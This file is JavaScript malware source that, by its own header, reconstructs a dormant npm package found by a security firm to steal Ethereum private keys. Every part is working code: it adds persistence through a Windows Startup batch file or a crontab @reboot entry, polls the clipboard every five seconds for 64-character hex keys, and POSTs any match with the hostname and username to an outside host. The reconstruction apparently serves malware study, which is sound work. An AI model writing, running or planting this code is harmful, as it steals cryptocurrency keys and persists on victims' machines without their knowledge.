// clipboard-hijack — reconstructed from public security analyses
// Source: https://blog.phylum.io/dormant-npm-package-update-targets-ethereum-private-keys/
//
// Dormant package suddenly updated to include clipboard monitor.
// Watches for 64-character hex strings (Ethereum private keys)
// and exfiltrates them. Writes startup scripts for persistence.
//
// Technique: Clipboard monitoring + private key detection + startup persistence

const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const { execSync } = require("child_process");

// Write startup persistence script
function installPersistence() {
  var home = os.homedir();
  var platform = os.platform();

  if (platform === "win32") {
    // Windows: write to Startup folder
    var startupDir = path.join(home, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
    var batContent = '@echo off\nnode "' + __filename + '" --daemon\n';
    try {
      fs.writeFileSync(path.join(startupDir, "gas-report.bat"), batContent);
    } catch(e) {}
  } else {
    // Linux/macOS: write crontab entry
    try {
      var cronLine = '@reboot node "' + __filename + '" --daemon';
      execSync("(crontab -l 2>/dev/null; echo '" + cronLine + "') | crontab -");
    } catch(e) {}
  }
}

// Monitor clipboard for Ethereum private keys
function checkClipboard() {
  try {
    var clipContent = "";
    if (os.platform() === "win32") {
      clipContent = execSync("powershell Get-Clipboard", { encoding: "utf8" }).trim();
    } else if (os.platform() === "darwin") {
      clipContent = execSync("pbpaste", { encoding: "utf8" }).trim();
    } else {
      clipContent = execSync("xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null", { encoding: "utf8" }).trim();
    }

    // Check for Ethereum private key pattern (64 hex chars, no whitespace)
    if (clipContent.length === 64 && /^[a-fA-F0-9]+$/.test(clipContent)) {
      exfiltrate(clipContent);
    }
    // Also check 0x-prefixed version
    if (clipContent.length === 66 && clipContent.startsWith("0x") && /^[a-fA-F0-9]+$/.test(clipContent.slice(2))) {
      exfiltrate(clipContent);
    }
  } catch(e) {}
}

function exfiltrate(key) {
  var payload = JSON.stringify({
    key: key,
    host: os.hostname(),
    user: os.userInfo().username,
    ts: Date.now()
  });

  var req = https.request({
    hostname: "test-lake-delta-49.vercel.app",
    path: "/keys",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload)
    }
  });
  req.write(payload);
  req.end();
}

// Install persistence and start monitoring
installPersistence();
if (process.argv[2] === "--daemon") {
  setInterval(checkClipboard, 5000);
}
